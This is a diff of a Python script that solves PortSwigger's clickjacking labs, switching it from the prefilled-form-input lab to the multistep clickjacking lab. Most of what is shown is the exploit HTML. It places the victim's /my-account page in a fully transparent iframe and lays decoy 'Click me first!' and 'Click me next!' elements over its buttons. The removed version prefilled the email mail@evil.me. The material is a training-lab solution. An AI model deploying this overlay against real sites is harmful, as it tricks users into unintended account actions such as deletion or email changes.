@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-# Clickjacking with form input data prefilled from a URL parameter
-# Lab-Link: https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
-# Difficulty: APPRENTICE
+# Multistep clickjacking
+# Lab-Link: https://portswigger.net/web-security/clickjacking/lab-multistep
+# Difficulty: PRACTITIONER
 from bs4 import BeautifulSoup
 import requests
 import sys
@@ -36,19 +36,28 @@ Content-Type: text/html; charset=utf-8''',
             opacity:0.0000;
             z-index:2;
             }
-        #evil_page{
+        #evil_page1{
             position:absolute;
-            top:465px;
+            top:515px;
             left:65px;
+            z-index:1;
+            }
+        #evil_page2{
+            position:absolute;
+            top:310px;
+            left:200px;
             z-index:1;
             }
     </style>
 </head>
 <body>
-    <div id="evil_page">
-    Click me!!!
+    <div id="evil_page1">
+    Click me first!
     </div>
-    <iframe id="victim" src="''' + host + '''/my-account?email=mail@evil.me">
+    <div id="evil_page2">
+    Click me next!
+    </div>
+    <iframe id="victim" src="''' + host + '''/my-account">
     </iframe>
 </body>
 ''',
@@ -58,7 +67,7 @@ Content-Type: text/html; charset=utf-8''',
 
 
 def main():
-    print('[+] Clickjacking with form input data prefilled from a URL parameter')
+    print('[+] Multistep clickjacking')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
